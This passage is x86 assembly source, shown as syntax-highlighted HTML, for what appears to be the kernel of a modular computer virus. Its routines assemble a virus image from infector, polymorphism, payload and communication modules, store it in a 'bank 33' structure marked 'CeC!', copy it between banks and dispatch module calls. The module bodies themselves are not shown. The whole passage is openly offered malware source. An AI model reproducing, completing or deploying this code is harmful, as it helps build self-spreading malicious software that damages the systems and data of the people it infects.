    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PointerTable</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lmt</span><span class="sc0">
    </span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VirusStart</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lmt2</span><span class="sc0">
    
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">BuildModulesImage</span><span class="sc4">:</span><span class="sc0">
    
    </span><span class="sc1">; out:  ebx = virus offset</span><span class="sc0">
    </span><span class="sc1">;   ecx = virus size</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebp</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">33</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">LoadBankInfo</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'CeC!'</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">heydoitnow</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   bank 33 is a CeCile structure:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   0 -     CeC header mark</span><span class="sc0">
</span><span class="sc1">;   4 -     virus size</span><span class="sc0">
</span><span class="sc1">;   8 -     bank 33 version</span><span class="sc0">
</span><span class="sc1">;   12 -    bank size</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   mov     edx,dword ptr [eax+8]</span><span class="sc0">
</span><span class="sc1">;   loadpointer ecx, VersionDirty, dtt</span><span class="sc0">
</span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc1">;   int     3</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   cmp     dword ptr [ecx],edx</span><span class="sc0">
</span><span class="sc1">;   jb      takeminemine</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">takeminemine</span><span class="sc0">

</span><span class="sc5">heydoitnow</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'CeC!'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VirusStart</span><span class="sc4">,</span><span class="sc5">bm1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PointerTable</span><span class="sc4">-</span><span class="sc5">VirusStart</span><span class="sc0">    </span><span class="sc1">; drop kernel</span><span class="sc0">
    </span><span class="sc6">repz</span><span class="sc0">        </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">StartMod</span><span class="sc4">-</span><span class="sc5">PointerTable</span><span class="sc0">
    </span><span class="sc6">repz</span><span class="sc0">        </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">090h</span><span class="sc0">     </span><span class="sc1">; set a nop to have </span><span class="sc0">
                            </span><span class="sc1">; non void pointers</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; (mean non present </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; modules)</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">fillit</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; load module</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">finishflushing</span><span class="sc0">
    
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; compatible with </span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">notgoodbye</span><span class="sc0">          </span><span class="sc1">; kernel 1 ?</span><span class="sc0">

</span><span class="sc5">notgoodbye</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; load module version</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc5">modulenumber</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">     </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; save module version</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">
    
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">modulenumber</span><span class="sc0">        
    </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; pointer is inverse</span><span class="sc0">
                            </span><span class="sc1">; of versions ID</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">; save pointer</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; load module size</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">repz</span><span class="sc0">        </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; flush size</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">finishflushing</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">modulenumber</span><span class="sc0">        </span><span class="sc1">; all flushed ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">fillit</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">       </span><span class="sc1">; set version</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">       </span><span class="sc1">; set size</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">LoadUpdateVersion</span><span class="sc0">

</span><span class="sc5">takeminemine</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">FlushModule</span><span class="sc0">         </span><span class="sc1">; flush modules</span><span class="sc0">
    
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">CopyVirusImageToBank</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ecx</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">33</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">LoadBankInfo</span><span class="sc0">            </span><span class="sc1">; copy from bank 33</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">LoadBankInfo</span><span class="sc0">            </span><span class="sc1">; to chosen bank</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">

    </span><span class="sc6">repz</span><span class="sc0">        </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">getvirusminiversion</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">; load a compressed version of the kernel </span><span class="sc0">
                </span><span class="sc1">; format ( 8 bit )</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">VersionDirty</span><span class="sc4">,</span><span class="sc5">gvm</span><span class="sc0">

</span><span class="sc6">movzx</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">               </span><span class="sc1">; 4 version of infector</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">; 16 version of poly</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; 4 version of payload</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Fini0</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">StartMod</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">m1</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">InfectMod</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">m9</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">Fini</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">m1B</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0">         </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">Init0</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">RoutineHandler</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">k3</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">StartMod</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">m2</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">modulenumber</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">modulenumber</span><span class="sc0">        </span><span class="sc1">; fix here module number</span><span class="sc0">

</span><span class="sc5">getittomax</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getnextfill</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">getnextfill</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">        </span><span class="sc5">getittomax</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">Init</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">m2B</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">skipthatone</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; coz Ini/Fini located in code</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">skipthatone</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ModuleCall</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PointerTable</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mC1</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">StartMod</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mC2</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">VersionDirty</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">     

</span><span class="sc5">PointerTable</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Fini</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">fini_m0</span><span class="sc4">-</span><span class="sc5">InfectStart</span><span class="sc0">
</span><span class="sc5">FiniVal</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Init</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">InitVal</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">modulenumber</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">InfectMod</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">InfectStart</span><span class="sc4">-</span><span class="sc5">StartMod</span><span class="sc0">
</span><span class="sc5">PolyMod</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">PolyStart</span><span class="sc4">-</span><span class="sc5">StartMod</span><span class="sc0">
</span><span class="sc5">PayloadMod</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">PayloadStart</span><span class="sc4">-</span><span class="sc5">StartMod</span><span class="sc0">
</span><span class="sc5">ComMod</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">CommodStart</span><span class="sc4">-</span><span class="sc5">StartMod</span><span class="sc0">

</span><span class="sc1">; DebugMod: dd  0</span><span class="sc0">

</span><span class="sc5">StartMod</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; here should come the modules include</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
